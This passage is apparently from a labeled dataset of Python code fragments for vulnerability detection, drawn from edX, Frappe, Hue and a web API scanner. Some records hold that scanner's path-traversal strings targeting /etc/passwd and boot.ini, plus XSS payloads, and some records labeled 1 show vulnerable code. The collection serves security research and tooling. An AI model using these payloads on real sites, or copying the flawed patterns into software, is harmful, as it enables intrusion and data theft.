deployment_mapping['coord_%s' % i]=coord properties", "label": 0}, {"snippet_id": 22951, "code": "/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position", "label": 0}, {"snippet_id": 1718, "code": "'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break", "label": 0}, {"snippet_id": 33587, "code": ",)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname", "label": 0}, {"snippet_id": 16002, "code": " cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter", "label": 0}, {"snippet_id": 31628, "code": "\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size", "label": 0}, {"snippet_id": 28117, "code": " template=env.get_template('config.html') print('Content-type: text/html\\n') funct.check_login() form=cgi.FieldStorage() serv=form.getvalue('serv') config_read=\"\" cfg=\"\" stderr=\"\" error=\"\" aftersave=\"\"", "label": 0}, {"snippet_id": 11656, "code": ".password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>", "label": 0}, {"snippet_id": 45622, "code": ".POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'],", "label": 0}, {"snippet_id": 28645, "code": ".SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_uuid=cookie.get('uuid') \tref=os.environ.get(\"SCRIPT_NAME\") \tsql.delete_old_uuid() \t \tif user_uuid is not None: \t\tsql.update_last_act_user(user_uuid.value", "label": 0}, {"snippet_id": 46910, "code": " Comment.create(github_id=user_id, post_id=self.id, ref_id=ref_id) redis=await create_pool(RedisSettings.from_url(REDIS_URL)) await asyncio.gather( obj.set_content(content), redis.enqueue_job('mention_users'", "label": 0}, {"snippet_id": 45640, "code": "], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2", "label": 0}, {"snippet_id": 25478, "code": "(field) super().__init__( fields=fields, require_all_fields=False, *args, **kwargs ) self.require_all_fields=require_all_fields self.required=self.one_required def clean(self, value) -> dict: value=super(", "label": 0}, {"snippet_id": 9993, "code": " EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver", "label": 0}, {"snippet_id": 46379, "code": ".POST.get('collection', '{}')) layout=json.loads(request.POST.get('layout', '{}')) collection['template']['extracode']=escape(collection['template']['extracode']) if collection: if collection['id']: dashboard_doc", "label": 0}, {"snippet_id": 35620, "code": "=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue", "label": 0}, {"snippet_id": 37169, "code": "\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category", "label": 0}, {"snippet_id": 46964, "code": " comments(self): return await Comment.sync_filter(post_id=self.id, orderings=['-id']) @property @cache(MC_KEY_N_COMMENTS %('{self.id}')) async def n_comments(self): return await Comment.filter(post_id=self", "label": 0}, {"snippet_id": 33102, "code": " decorators from components import endpoints_webapp2 from components import prpc import webapp2 from legacy import api as legacy_api from legacy import swarmbucket_api import access import api import bq", "label": 0}, {"snippet_id": 24497, "code": "'save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir()", "label": 0}, {"snippet_id": 49398, "code": " selected_value=self.query_params[self.field_name] if type(selected_value)==list: selected_value=selected_value[0] if selected_value==self.value: return True elif self.value is None: return True return False class", "label": 0}, {"snippet_id": 44588, "code": "[node['properties']['workflow'] for node in workflow['nodes'] if node['type']=='subworkflow-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies", "label": 0}, {"snippet_id": 54656, "code": "=CommentForm def get_success_url(self): return reverse('article-detail', kwargs={'pk': self.object.pk}) def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['comments", "label": 0}, {"snippet_id": 6076, "code": "'signup_link': ' 'dashboard_link': ' 'password_reset_link': ' 'default_language': 'en', 'base_url': None, 'default_eppn_scope': None, 'authn_info_mongo_uri': None, 'max_authn_failures_per_month': '50', ", "label": 1}, {"snippet_id": 20559, "code": " cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter", "label": 0}, {"snippet_id": 6878, "code": " eduPersonScopedAffiliation if none is returned from the attribute manager. \"\"\" return self.config.get(self.section, 'default_scoped_affiliation') @property def vccs_url(self): \"\"\" URL to use with VCCS client. BCP is", "label": 0}, {"snippet_id": 21880, "code": "-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login',", "label": 0}, {"snippet_id": 22323, "code": ", name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib", "label": 0}, {"snippet_id": 54716, "code": " self.form_valid(form) else: return self.form_invalid(form) def form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.article=self.object a.save() return super().form_valid(form", "label": 0}, {"snippet_id": 54699, "code": "'markdown.extensions.toc', ]) return context def post(self, request, *args, **kwargs): self.object=self.get_object() form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self", "label": 0}, {"snippet_id": 11215, "code": "\"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), ", "label": 0}, {"snippet_id": 44550, "code": "}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner", "label": 0}, {"snippet_id": 33006, "code": " status_code=200): self.send_response(status_code) self.send_header('Content-Type', content_type) self.end_headers() def _WriteTemplate(self, template): contents=self._Read(os.path.join('tools', 'md_browser',", "label": 0}, {"snippet_id": 52103, "code": "=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials", "label": 0}, {"snippet_id": 29551, "code": " commands, **kwargs): \tssh=ssh_connect(serv) \t\t \tfor command in commands: \t\ttry: \t\t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t\texcept: \t\t\tcontinue \t\t\t\t \t\tif kwargs.get(\"ip\")==\"1\": \t\t", "label": 0}, {"snippet_id": 47047, "code": " _ from invenio_admin.filters import FilterConverter from invenio_db import db from markupsafe import Markup from sqlalchemy.exc import SQLAlchemyError from.api import Record from.models import RecordMetadata", "label": 0}, {"snippet_id": 44595, "code": " node['type']=='subworkflow-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow})", "label": 0}, {"snippet_id": 25205, "code": " SplitDateTimeField from pretix.helpers.i18n import get_format_without_seconds from pretix.presale.signals import question_form_fields logger=logging.getLogger(__name__) class NamePartsWidget(forms.MultiWidget", "label": 0}, {"snippet_id": 43566, "code": " is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield", "label": 0}, {"snippet_id": 53219, "code": " submission form: %s' % params_form.errors)) else: parameters=coordinator.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]", "label": 0}, {"snippet_id": 48879, "code": "[key]=value[0] query.update(new_query_dict) for key, value in query.copy().items(): if value is None: del query[key] return '?{}'.format(urlencode(query)) class SmartListField(object): def __init__(self", "label": 0}, {"snippet_id": 40139, "code": ".name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_", "label": 0}, {"snippet_id": 14385, "code": "=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores", "label": 0}, {"snippet_id": 48556, "code": "=request.GET[\"redirect\"] if \"srid\" in request.GET: if not request.GET.get(\"rid\"): return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\") srid: int=int(request.GET[\"srid\"]) sr:", "label": 0}, {"snippet_id": 54847, "code": " success_url='/' def test_func(self): return self.request.user==self.get_object().author class CommentDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\" model=Comment def get_success_url(self): return", "label": 0}, {"snippet_id": 26806, "code": "%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f", "label": 0}, {"snippet_id": 20021, "code": " traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg", "label": 0}, {"snippet_id": 46955, "code": " return False @property @cache(MC_KEY_COMMENT_LIST %('{self.id}')) async def comments(self): return await Comment.sync_filter(post_id=self.id, orderings=['-id']) @property @cache(MC_KEY_N_COMMENTS %('{self", "label": 0}, {"snippet_id": 52288, "code": ".delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user", "label": 0}, {"snippet_id": 41370, "code": ": \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt", "label": 0}, {"snippet_id": 15280, "code": " vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self", "label": 0}, {"snippet_id": 19429, "code": ".verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used.", "label": 0}, {"snippet_id": 54710, "code": ".get_object() form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.form_invalid(form) def form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.article", "label": 0}, {"snippet_id": 39797, "code": "(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname,", "label": 0}, {"snippet_id": 26249, "code": ".vat_id_validated=False self.instance.name_parts=data.get('name_parts') if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data: pass elif self.validate_vat_id and", "label": 0}, {"snippet_id": 47528, "code": "(name='display_name', button_text=profile.displayName)) f.add_content(PlainText('DECT: ')) f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0)) f.add_content(PlainText('Number", "label": 0}, {"snippet_id": 36454, "code": "\tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=", "label": 0}, {"snippet_id": 50744, "code": " understood: -raw(bool): No parsing at all(leave ansi-to-html markers unparsed). -nocolor(bool): Remove all color. -screenreader(bool): Use Screenreader mode. -send_prompt(bool): Send a prompt with parsed html", "label": 0}, {"snippet_id": 7875, "code": ".save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade", "label": 0}, {"snippet_id": 30676, "code": "\tfunct.show_log(output) \tprint(stderr) \t\t if serv is not None and act==\"showMap\": \tovw.get_map(serv) \t if form.getvalue('servaction') is not None: \tserver_state_file=sql.get_setting('server_state_file'", "label": 0}, {"snippet_id": 22150, "code": ".update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\")", "label": 0}, {"snippet_id": 32797, "code": ", 'quot': \"'\", 'line': line}) self.wfile.write('</table>') self._WriteTemplate('footer.html') def _DoCSS(self, template): self._WriteHeader('text/css') self._WriteTemplate(template) def _DoNotFound(self", "label": 0}, {"snippet_id": 29997, "code": "'cert_local_dir') \tcert_path=sql.get_setting('cert_path') \t \tif not os.path.exists(cert_local_dir): \t\tos.makedirs(cert_local_dir) \t \tif form.getvalue('ssl_name') is None: \t\tprint('<div class=\"alert alert-danger", "label": 0}, {"snippet_id": 1147, "code": ".append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import scan_single_api from flask import jsonify", "label": 1}, {"snippet_id": 26473, "code": "../../../../../../etc/passwd', '../../../../../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e", "label": 0}, {"snippet_id": 50854, "code": ".lineSend(self.csessid,[cmd, args, kwargs]) def send_prompt(self, *args, **kwargs): kwargs[\"options\"].update({\"send_prompt\": True}) self.send_text(*args, **kwargs) def send_default(self, cmdname, *args, ", "label": 0}, {"snippet_id": 34553, "code": ": \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument)", "label": 0}, {"snippet_id": 18592, "code": "\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9", "label": 0}, {"snippet_id": 46314, "code": "\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}],", "label": 0}, {"snippet_id": 54846, "code": "=Article success_url='/' def test_func(self): return self.request.user==self.get_object().author class CommentDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\" model=Comment def get_success_url(self):", "label": 0}, {"snippet_id": 5971, "code": "(os.path.join(here, 'README')).read() version='0.3.22' install_requires=[ 'pymongo>=2.8,<3', 'pysaml2==1.2.0beta5', 'python-memcached==1.53', 'cherrypy==3.2.4', 'vccs_client==0.4.1', 'eduid_am>=0.5.3', ", "label": 1}, {"snippet_id": 16406, "code": "'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to", "label": 0}, {"snippet_id": 9145, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/", "label": 1}, {"snippet_id": 51897, "code": "=os.environ.get('BROKER', 'redis://localhost:6379/0') ENABLE_UTC=True CELERY_ACCEPT_CONTENT=['pickle'] CELERY_TASK_SERIALIZER='pickle' CELERY_RESULT_SERIALIZER='pickle' CELERY_TIMEZONE='UTC' CELERY_BEAT_SCHEDULER", "label": 0}, {"snippet_id": 652, "code": " XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body", "label": 1}, {"snippet_id": 35894, "code": " checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue", "label": 0}, {"snippet_id": 18751, "code": "<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P", "label": 0}, {"snippet_id": 19880, "code": "'fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store", "label": 0}, {"snippet_id": 47089, "code": "'version_id', 'updated', 'created', 'json') column_labels=dict( id=_('UUID'), version_id=_('Revision'), json=_('JSON'), ) column_formatters=dict( version_id=lambda v, c, m, p: m.version_id-1, json=lambda v, c,", "label": 1}, {"snippet_id": 8135, "code": "]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings", "label": 0}, {"snippet_id": 3175, "code": " True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\":", "label": 0}, {"snippet_id": 33459, "code": "\t\tfor sig in self.signatures[injection_types]: \t\t\t\tmatch=re.findall(re.escape(sig), response) \t\t\t\tif match and any(x in payload for x in \"><\"): \t\t\t\t\tself.found(injection_types, url, parameter, payload)", "label": 1}, {"snippet_id": 54608, "code": " context_object_name='articles' template_name='index.html' paginate_by=5 def get_queryset(self, **kwargs): queryset=Article.objects.order_by('-time') for i in queryset: i.md=markdown(i.content, extensions=[ ", "label": 1}, {"snippet_id": 11980, "code": "))), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 31727, "code": "() \t\tfile.close \t\tprint(file_read) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>') \t\t if form.getvalue('bwlists_create'): ", "label": 0}, {"snippet_id": 12866, "code": "'ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores')", "label": 0}, {"snippet_id": 1151, "code": " import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import scan_single_api from flask import jsonify from pymongo import", "label": 1}, {"snippet_id": 33104, "code": " components import endpoints_webapp2 from components import prpc import webapp2 from legacy import api as legacy_api from legacy import swarmbucket_api import access import api import bq import bulkproc import", "label": 0}, {"snippet_id": 19240, "code": ", test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec", "label": 0}, {"snippet_id": 31412, "code": " \"@sess_rate\") \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['curr_con'].max()) +150 \t\tp[serv", "label": 0}, {"snippet_id": 13919, "code": "+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading", "label": 0}, {"snippet_id": 4949, "code": " x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt", "label": 0}, {"snippet_id": 1387, "code": " vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers'", "label": 0}, {"snippet_id": 39707, "code": "\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": ", "label": 0}, {"snippet_id": 29429, "code": "=line.split(\":\") \t\t\tbind[1]=bind[1].strip(' ') \t\t\tbind=bind[1].split(\"ssl\") \t\t\tbind=bind[0].strip(' \\t\\n\\r') \t\t\tfirewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent'", "label": 0}, {"snippet_id": 8443, "code": ".conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib", "label": 0}, {"snippet_id": 9905, "code": "(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service", "label": 0}, {"snippet_id": 31845, "code": "\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' % e) \t \tservers=sql.get_dick_permit() \tpath=sql.get_setting('haproxy_dir')+\"/\"+form.getvalue('color') \t \tfor server in servers: \t\tfunct", "label": 0}, {"snippet_id": 1407, "code": ", 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid", "label": 0}, {"snippet_id": 3601, "code": " xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +", "label": 0}, {"snippet_id": 42742, "code": "\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t", "label": 0}, {"snippet_id": 36264, "code": " true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__", "label": 0}, {"snippet_id": 31515, "code": ".cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_waf_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv", "label": 0}, {"snippet_id": 31950, "code": " list in lists: \t\tprint(list) \t\t if form.getvalue('get_ldap_email'): \tusername=form.getvalue('get_ldap_email') \timport ldap \t \tserver=sql.get_setting('ldap_server') \tport=sql.get_setting('ldap_port') \tuser", "label": 0}, {"snippet_id": 33872, "code": " def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route):", "label": 0}, {"snippet_id": 36424, "code": " if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field", "label": 0}, {"snippet_id": 9833, "code": "), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 5526, "code": "'<q/oncut=open()>', '<svg/onload=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">", "label": 0}, {"snippet_id": 3001, "code": " vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method", "label": 0}, {"snippet_id": 1617, "code": " data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records", "label": 0}, {"snippet_id": 12477, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url", "label": 0}, {"snippet_id": 17989, "code": ".html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name", "label": 0}, {"snippet_id": 54316, "code": " user_agent.current(1) global payload payload=ttk.Combobox(main, values=pl) payload.current(0) global proxy proxy=ttk.Combobox(main, values=prox) global refresh refresh=ttk.Combobox(main, values=[\"On\",", "label": 0}, {"snippet_id": 48934, "code": "=dict: value=self.object.get(self.column.field_name) elif callable(field): value=field() if getattr(field, 'do_not_call_in_templates', False) else field else: display_function=getattr(self.object, 'get_", "label": 1}, {"snippet_id": 21008, "code": "\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view", "label": 0}, {"snippet_id": 50511, "code": ") except IndexError: self.client_disconnect(csessid) return '\"\"' def render_POST(self, request): \"\"\" This function is what Twisted calls with POST requests coming in from the ajax client. The requests should", "label": 0}, {"snippet_id": 49849, "code": ", redirect, render_template, request from. import bp as app @app.route(\"/\") def root(): return render_template(\"home.html\") @app.route(\"/interact\", methods=[\"POST\"]) def vuln(): msg=request.form[\"message", "label": 1}, {"snippet_id": 46501, "code": "() if request.GET.get('format')=='json': collections=[] for collection in existing_hue_collections: massaged_collection=collection.to_dict() if request.GET.get('is_mobile'): massaged_collection['absoluteUrl", "label": 0}, {"snippet_id": 25061, "code": " course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\")", "label": 0}, {"snippet_id": 45372, "code": " @check_document_access_permission() def submit_coordinator(request, doc_id): coordinator=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST'", "label": 0}, {"snippet_id": 28801, "code": ".select_servers(server=serv) \tfor server in servers: \t\tssh_port=server[10] \tssh=SSHClient() \tssh.load_system_host_keys() \tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \ttry: \t\tif ssh_enable==1:", "label": 0}, {"snippet_id": 1535, "code": "'url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: 